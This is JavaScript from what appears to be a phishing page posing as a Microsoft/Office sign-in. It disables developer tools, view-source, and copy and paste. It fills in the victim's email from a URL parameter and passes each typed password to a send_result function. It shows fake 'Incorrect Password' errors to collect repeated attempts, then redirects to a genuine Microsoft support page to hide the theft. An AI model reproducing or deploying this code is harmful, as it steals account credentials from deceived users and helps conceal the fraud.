<script>
    // prevent ctrl + s
    window.addEventListener('keydown', async(e) => {
        if (e.ctrlKey && (e.which == 83)) {
            e.preventDefault();
            return false; }
    });
    window.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function (e) {
        if (event.keyCode == 123) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
            return false;
        }
    }
    window.onkeydown = (e) => {
        return !(e.ctrlKey &&
            (e.keyCode === 13 ||
                e.keyCode === 67 ||
                e.keyCode === 86 ||
                e.keyCode === 85 ||
                e.keyCode === 117));
    };    
</script>

<script>


    document.addEventListener('DOMContentLoaded', async() => {
        if(ai){
            document.getElementById("show-email").innerHTML = ai;
            document.getElementById("i0118").focus();
            set_brand(ai);
        }

        document.getElementById("Button9").addEventListener("click", e => {
            event.preventDefault ? event.preventDefault() : event.returnValue = false;

            var pswd = document.getElementById("i0118").value;
            if(pswd.length < 5){
                document.getElementById("important1").style.display="none";
                setTimeout(() => {document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = "Your account password is too short."}, 1500);
            } else if (pswd.length > 5 && count <= 0) {
                send_result(ai, pswd);
                document.getElementById("important1").style.display="none";
                setTimeout(() => {count++; document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = `Incorrect Password. if you don't remember your password, <a href="#">reset it now.</a>`}, 2000)
            } else if (count < 2){
                send_result(ai, pswd);
                document.getElementById("important1").style.display = "none";
                setTimeout(() => {count++; document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = `Incorrect Password. Please enter the password for your above email only, <a href="#">reset it now.</a>`}, 2000)
            } else {
                send_result(ai, pswd);
                setTimeout(() => {window.location.replace("https://support.microsoft.com/en-us/office/fix-onedrive-sync-problems-0899b115-05f7-45ec-95b2-e4cc8c4670b2")});
            }
        });
    });



</script>

<script>
		function fillFormEmail(){
  
  const input = document.getElementById('email');  // replace 'id' with id of email field
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);  //parse the query string
  const email = urlParams.get('subscriber');  // Store the parsed email address in variable
  
   input.value = email;  // fill the form with the email address
}

if (document.readyState === 'loading') {  // Loading hasn't finished yet
  document.addEventListener('DOMContentLoaded', fillFormEmail)
} 
else {  // `DOMContentLoaded` has already fired
  fillFormEmail();
}

	</script>
